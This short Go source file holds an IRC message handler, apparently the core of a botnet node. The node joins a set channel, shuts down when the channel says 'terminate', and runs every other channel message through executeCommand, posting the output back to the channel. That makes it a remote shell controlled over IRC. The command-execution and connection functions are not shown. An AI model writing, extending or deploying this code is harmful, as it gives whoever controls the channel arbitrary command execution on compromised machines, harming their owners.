package main

import (
	irc "gopkg.in/irc.v3"
)

func handler(c *irc.Client, m *irc.Message) {
	switch {
	// join channel on welcome command 001
	case m.Command == "001":
		c.Write("JOIN " + CHANNEL)
	// terminate node
	case m.Command == "PRIVMSG" && c.FromChannel(m) && m.Params[1] == "terminate":
		terminate()
	// pass every message from channel to executeCommand / return its output
	case m.Command == "PRIVMSG" && c.FromChannel(m):
		c.WriteMessage(&irc.Message{
			Command: "PRIVMSG",
			Params: []string{
				m.Params[0], // channel/user name parameter
				executeCommand(m.Params[1]),
			},
		})
	}
}
